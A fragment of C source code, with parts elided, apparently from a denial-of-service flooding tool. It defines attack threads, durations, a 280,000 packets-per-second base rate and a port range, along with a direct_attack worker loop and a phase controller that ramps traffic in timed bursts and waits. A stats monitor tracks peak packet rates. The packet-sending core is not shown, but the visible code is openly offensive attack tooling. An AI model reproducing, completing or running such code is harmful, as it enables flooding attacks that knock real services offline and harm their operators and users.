...
#define MIN_THREADS 80
#define MAX_THREADS 400
#define MIN_ATTACK_TIME 60
#define MAX_ATTACK_TIME 300
#define BASE_PPS 280000
#define PORT_RANGE 40000
#define BATCH_UPDATE 25000
#define PHASE_WARMUP 6
#define PHASE_WAIT1 3
#define PHASE_WARMUP2 9
#define PHASE_WAIT2 8
...
void rate_limit_sleep(unsigned long long sent_this_burst, struct timeval *burst_start, int thread_count) {
    ...
    long per_thread_pps = target_pps_current / thread_count;
    if (per_thread_pps == 0) per_thread_pps = 1000;
    ...
    if (target_us > 0 && elapsed_us < target_us) {
        ...
        if (sleep_us > 100 && sleep_us < 50000) {
            usleep(sleep_us);
        }
    }
}
...
void *direct_attack(void *arg) {
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        rate_limit_sleep(burst_packets, &burst_start, THREAD_COUNT);
...
void *phase_controller(void *arg) {
    ...
    atomic_store(&target_pps, (unsigned long long)(BASE_PPS * 0.7));
    printf("🎯 PHASE 1: 6s @ 70%%\n");
    atomic_store(&attack_phase, 1);
    sleep(PHASE_WARMUP);
    
    printf("⏸️  PHASE 2: 3s Wait\n");
    atomic_store(&attack_phase, 2);
    sleep(PHASE_WAIT1);
    
    atomic_store(&target_pps, (unsigned long long)(BASE_PPS * 0.9));
    printf("🎯 PHASE 3: 9s @ 90%%\n");
    atomic_store(&attack_phase, 3);
    sleep(PHASE_WARMUP2);
    
    printf("⏸️  PHASE 4: 8s Wait\n");
    atomic_store(&attack_phase, 4);
    sleep(PHASE_WAIT2);
    
    int main_attack = ATTACK_TIME - 26;
    if (main_attack < 40) main_attack = 40;
...
void *stats_monitor(void *arg) {
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        int current_phase;
        if (elapsed <= PHASE_WARMUP) {
            current_phase = 1;
        } else if (elapsed <= PHASE_WARMUP + PHASE_WAIT1) {
            current_phase = 2;
        } else if (elapsed <= PHASE_WARMUP + PHASE_WAIT1 + PHASE_WARMUP2) {
            current_phase = 3;
        } else if (elapsed <= PHASE_WARMUP + PHASE_WAIT1 + PHASE_WARMUP2 + PHASE_WAIT2) {
            current_phase = 4;
        } else {
            current_phase = 5;
        }
        ...
        if (current_phase == 2 || current_phase == 4) {
            ...
            if (current_peak == 0) {
                ...
                if (current_peak > 10000 && (pps - current_peak) > (current_peak / 4)) {
                    atomic_store(&peak_pps, current_peak + (pps - current_peak) / 3);
                } else {
                    atomic_store(&peak_pps, pps);
                }
            }
